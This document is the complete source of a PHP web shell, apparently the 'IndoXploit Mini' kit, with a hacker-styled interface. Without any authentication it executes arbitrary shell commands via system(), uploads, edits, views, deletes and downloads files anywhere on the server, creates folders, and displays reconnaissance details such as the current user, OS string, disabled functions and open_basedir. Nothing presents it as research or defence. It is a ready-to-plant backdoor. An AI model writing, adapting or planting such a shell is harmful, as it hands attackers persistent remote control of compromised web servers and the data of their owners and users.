<?php
error_reporting(0);
$currentDir = isset($_REQUEST['dir']) ? $_REQUEST['dir'] : getcwd();
$currentDir = str_replace('\\', '/', $currentDir);
$currentDir = rtrim($currentDir, '/') . '/';

// Handle Upload
$message = '';
if(isset($_FILES['upload'])) {
    $target = $currentDir . basename($_FILES['upload']['name']);
    if(move_uploaded_file($_FILES['upload']['tmp_name'], $target)) {
        $message = '<span style="color:#00ff00;">✓ Upload sukses: ' . $_FILES['upload']['name'] . '</span>';
    } else {
        $message = '<span style="color:#ff0000;">✗ Upload gagal</span>';
    }
}

// Handle Delete
if(isset($_GET['delete'])) {
    $file = $currentDir . $_GET['delete'];
    if(unlink($file)) {
        $message = '<span style="color:#00ff00;">✓ Deleted: ' . $_GET['delete'] . '</span>';
    }
}

// Handle Save Edit
if(isset($_POST['save']) && isset($_POST['content'])) {
    $file = $currentDir . $_POST['filename'];
    if(file_put_contents($file, $_POST['content'])) {
        $message = '<span style="color:#00ff00;">✓ File saved</span>';
    }
}

// Handle Create Folder
if(isset($_GET['mkdir'])) {
    $newDir = $currentDir . $_GET['mkdir'];
    if(mkdir($newDir)) {
        $message = '<span style="color:#00ff00;">✓ Folder created</span>';
    }
}

// Handle Command
$cmdOutput = '';
if(isset($_POST['cmd']) && $_POST['cmd'] != '') {
    ob_start();
    system($_POST['cmd'] . " 2>&1");
    $cmdOutput = ob_get_clean();
}

// Get directory contents
$items = scandir($currentDir);
$folders = array();
$files = array();

if($items) {
    foreach($items as $item) {
        if($item == '.' || $item == '..') continue;
        $fullPath = $currentDir . $item;
        if(is_dir($fullPath)) {
            $folders[] = $item;
        } else {
            $files[] = $item;
        }
    }
}
sort($folders);
sort($files);

// Get system info
$uname = @exec('uname -a');
$whoami = @exec('whoami');
$pwd = $currentDir;
$phpversion = phpversion();
?>

<!DOCTYPE html>
<html>
<head>
    <title>IndoXploit Mini - PHP <?php echo $phpversion; ?></title>
    <meta charset="UTF-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0e12;
            font-family: 'Consolas', 'Courier New', monospace;
            color: #e0e0e0;
            padding: 20px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: #1a1e24;
            border: 1px solid #2a2e34;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 0 20px rgba(0,255,0,0.1);
        }
        .header {
            background: #0f1217;
            padding: 15px 20px;
            border-bottom: 2px solid #00ff00;
            color: #00ff00;
            text-shadow: 0 0 5px rgba(0,255,0,0.5);
        }
        .header h1 {
            font-size: 24px;
            margin-bottom: 5px;
        }
        .header .sysinfo {
            font-size: 12px;
            color: #888;
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
        }
        .header .sysinfo span {
            color: #00ff00;
        }
        .nav {
            background: #151a1f;
            padding: 15px 20px;
            border-bottom: 1px solid #2a2e34;
        }
        .path-bar {
            display: flex;
            gap: 10px;
        }
        .path-bar input {
            flex: 1;
            background: #0f1217;
            border: 1px solid #2a2e34;
            color: #00ff00;
            padding: 10px 15px;
            font-family: monospace;
            border-radius: 4px;
        }
        .path-bar button {
            background: #00ff00;
            color: #0a0e12;
            border: none;
            padding: 10px 25px;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
            text-transform: uppercase;
        }
        .path-bar button:hover {
            background: #00cc00;
        }
        .main-panel {
            display: flex;
            min-height: 600px;
        }
        .sidebar {
            width: 300px;
            background: #151a1f;
            border-right: 1px solid #2a2e34;
            padding: 20px;
        }
        .sidebar-section {
            background: #0f1217;
            border: 1px solid #2a2e34;
            border-radius: 4px;
            padding: 15px;
            margin-bottom: 20px;
        }
        .sidebar-section h3 {
            color: #00ff00;
            font-size: 14px;
            margin-bottom: 15px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .sidebar-section input[type=text] {
            width: 100%;
            background: #0a0e12;
            border: 1px solid #2a2e34;
            color: #00ff00;
            padding: 8px;
            margin-bottom: 10px;
            font-family: monospace;
        }
        .sidebar-section input[type=file] {
            width: 100%;
            background: #0a0e12;
            border: 1px solid #2a2e34;
            color: #00ff00;
            padding: 8px;
            margin-bottom: 10px;
        }
        .sidebar-section button {
            width: 100%;
            background: #00ff00;
            color: #0a0e12;
            border: none;
            padding: 8px;
            font-weight: bold;
            cursor: pointer;
            border-radius: 4px;
        }
        .sidebar-section button:hover {
            background: #00cc00;
        }
        .content {
            flex: 1;
            padding: 20px;
        }
        .cmd-output {
            background: #0f1217;
            border: 1px solid #2a2e34;
            border-radius: 4px;
            padding: 15px;
            margin-bottom: 20px;
            font-family: monospace;
            white-space: pre-wrap;
            color: #00ff00;
            max-height: 200px;
            overflow: auto;
        }
        .message {
            background: #0f1217;
            border: 1px solid #2a2e34;
            padding: 10px 15px;
            margin-bottom: 20px;
            border-radius: 4px;
        }
        .file-table {
            width: 100%;
            border-collapse: collapse;
        }
        .file-table th {
            background: #0f1217;
            color: #00ff00;
            padding: 10px;
            text-align: left;
            font-size: 12px;
            text-transform: uppercase;
            border-bottom: 2px solid #00ff00;
        }
        .file-table td {
            padding: 8px 10px;
            border-bottom: 1px solid #2a2e34;
        }
        .file-table tr:hover {
            background: #1f242a;
        }
        .folder-item {
            color: #00ff00;
            font-weight: bold;
            text-decoration: none;
        }
        .file-item {
            color: #e0e0e0;
            text-decoration: none;
        }
        .actions a {
            color: #00ff00;
            text-decoration: none;
            margin-right: 10px;
            font-size: 12px;
        }
        .actions a:hover {
            text-decoration: underline;
        }
        .edit-area {
            margin-top: 20px;
            background: #0f1217;
            border: 1px solid #2a2e34;
            border-radius: 4px;
            padding: 15px;
        }
        .edit-area textarea {
            width: 100%;
            height: 300px;
            background: #0a0e12;
            border: 1px solid #2a2e34;
            color: #00ff00;
            padding: 10px;
            font-family: monospace;
            margin-bottom: 10px;
        }
        .edit-area button {
            background: #00ff00;
            color: #0a0e12;
            border: none;
            padding: 10px 20px;
            font-weight: bold;
            cursor: pointer;
            border-radius: 4px;
        }
        .size {
            color: #888;
            font-size: 12px;
        }
        .icon {
            font-size: 16px;
            margin-right: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Mumei Mini [PHP <?php echo $phpversion; ?>]</h1>
            <div class="sysinfo">
                <div>User: <span><?php echo $whoami; ?></span></div>
                <div>Server: <span><?php echo $_SERVER['SERVER_SOFTWARE']; ?></span></div>
                <div>OS: <span><?php echo $uname; ?></span></div>
            </div>
        </div>

        <div class="nav">
            <form method="GET" class="path-bar">
                <input type="text" name="dir" value="<?php echo htmlspecialchars($currentDir); ?>" placeholder="Current directory...">
                <button type="submit">GO</button>
            </form>
        </div>

        <?php if($message != ''): ?>
        <div class="message"><?php echo $message; ?></div>
        <?php endif; ?>

        <div class="main-panel">
            <div class="sidebar">
                <div class="sidebar-section">
                    <h3>⚡ Command Execute</h3>
                    <form method="POST">
                        <input type="text" name="cmd" placeholder="ls -la / whoami / id" value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : ''; ?>">
                        <button type="submit">EXECUTE</button>
                    </form>
                </div>

                <div class="sidebar-section">
                    <h3>📤 Upload File</h3>
                    <form method="POST" enctype="multipart/form-data">
                        <input type="file" name="upload">
                        <input type="hidden" name="dir" value="<?php echo htmlspecialchars($currentDir); ?>">
                        <button type="submit">UPLOAD</button>
                    </form>
                </div>

                <div class="sidebar-section">
                    <h3>📁 Create Folder</h3>
                    <form method="GET">
                        <input type="hidden" name="dir" value="<?php echo htmlspecialchars($currentDir); ?>">
                        <input type="text" name="mkdir" placeholder="folder name">
                        <button type="submit">CREATE</button>
                    </form>
                </div>

                <div class="sidebar-section">
                    <h3>ℹ️ Info</h3>
                    <div style="color:#888; font-size:12px;">
                        PHP: <?php echo $phpversion; ?><br>
                        Safe Mode: <?php echo ini_get('safe_mode') ? 'ON' : 'OFF'; ?><br>
                        Disable Functions: <?php echo ini_get('disable_functions'); ?><br>
                        Open Basedir: <?php echo ini_get('open_basedir'); ?>
                    </div>
                </div>
            </div>

            <div class="content">
                <?php if($cmdOutput != ''): ?>
                <div class="cmd-output">
                    <strong style="color:#00ff00;">$ <?php echo htmlspecialchars($_POST['cmd']); ?></strong><br><br>
                    <?php echo htmlspecialchars($cmdOutput); ?>
                </div>
                <?php endif; ?>

                <table class="file-table">
                    <tr>
                        <th width="30%">Name</th>
                        <th width="15%">Size</th>
                        <th width="20%">Permissions</th>
                        <th width="20%">Modified</th>
                        <th width="15%">Actions</th>
                    </tr>
                    
                    <!-- Parent directory -->
                    <?php if($currentDir != '/'): ?>
                    <tr>
                        <td colspan="5">
                            <a href="?dir=<?php echo urlencode(dirname(rtrim($currentDir, '/'))); ?>" class="folder-item">📁 .. (Parent Directory)</a>
                        </td>
                    </tr>
                    <?php endif; ?>

                    <!-- Folders -->
                    <?php foreach($folders as $folder): ?>
                    <tr>
                        <td>
                            <a href="?dir=<?php echo urlencode($currentDir . $folder); ?>" class="folder-item">📁 <?php echo htmlspecialchars($folder); ?></a>
                        </td>
                        <td>-</td>
                        <td><?php echo substr(sprintf('%o', fileperms($currentDir . $folder)), -4); ?></td>
                        <td><?php echo date('Y-m-d H:i', filemtime($currentDir . $folder)); ?></td>
                        <td class="actions">
                            <a href="?dir=<?php echo urlencode($currentDir); ?>&delete=<?php echo urlencode($folder); ?>" onclick="return confirm('Delete folder?')">[del]</a>
                        </td>
                    </tr>
                    <?php endforeach; ?>

                    <!-- Files -->
                    <?php foreach($files as $file): 
                        $filePath = $currentDir . $file;
                        $size = filesize($filePath);
                        $sizeText = $size < 1024 ? $size . ' B' : ($size < 1048576 ? round($size/1024,2) . ' KB' : round($size/1048576,2) . ' MB');
                        $isText = preg_match('/\.(txt|php|html|js|css|xml|json|md|ini|conf|log|sql)$/i', $file);
                    ?>
                    <tr>
                        <td>
                            <span class="icon">📄</span>
                            <?php echo htmlspecialchars($file); ?>
                        </td>
                        <td class="size"><?php echo $sizeText; ?></td>
                        <td><?php echo substr(sprintf('%o', fileperms($filePath)), -4); ?></td>
                        <td><?php echo date('Y-m-d H:i', filemtime($filePath)); ?></td>
                        <td class="actions">
                            <?php if($isText): ?>
                                <a href="?dir=<?php echo urlencode($currentDir); ?>&edit=<?php echo urlencode($file); ?>">[edit]</a>
                            <?php endif; ?>
                            <a href="?dir=<?php echo urlencode($currentDir); ?>&view=<?php echo urlencode($file); ?>">[view]</a>
                            <a href="?dir=<?php echo urlencode($currentDir); ?>&delete=<?php echo urlencode($file); ?>" onclick="return confirm('Delete file?')">[del]</a>
                            <a href="<?php echo $filePath; ?>" download>[dl]</a>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </table>

                <!-- View File -->
                <?php if(isset($_GET['view'])):
                    $viewFile = $currentDir . $_GET['view'];
                    if(file_exists($viewFile)) {
                        $content = file_get_contents($viewFile);
                    } else {
                        $content = 'File not found';
                    }
                ?>
                <div class="edit-area">
                    <h3 style="color:#00ff00;">Viewing: <?php echo htmlspecialchars($_GET['view']); ?></h3>
                    <textarea readonly><?php echo htmlspecialchars($content); ?></textarea>
                    <a href="?dir=<?php echo urlencode($currentDir); ?>"><button>Back</button></a>
                </div>
                <?php endif; ?>

                <!-- Edit File -->
                <?php if(isset($_GET['edit'])):
                    $editFile = $currentDir . $_GET['edit'];
                    if(file_exists($editFile)) {
                        $content = file_get_contents($editFile);
                    } else {
                        $content = 'File not found';
                    }
                ?>
                <div class="edit-area">
                    <h3 style="color:#00ff00;">Editing: <?php echo htmlspecialchars($_GET['edit']); ?></h3>
                    <form method="POST">
                        <input type="hidden" name="filename" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
                        <input type="hidden" name="dir" value="<?php echo htmlspecialchars($currentDir); ?>">
                        <textarea name="content"><?php echo htmlspecialchars($content); ?></textarea>
                        <button type="submit" name="save">💾 Save Changes</button>
                        <a href="?dir=<?php echo urlencode($currentDir); ?>" style="margin-left:10px; color:#00ff00;">[Cancel]</a>
                    </form>
                </div>
                <?php endif; ?>
            </div>
        </div>
    </div>
</body>
</html>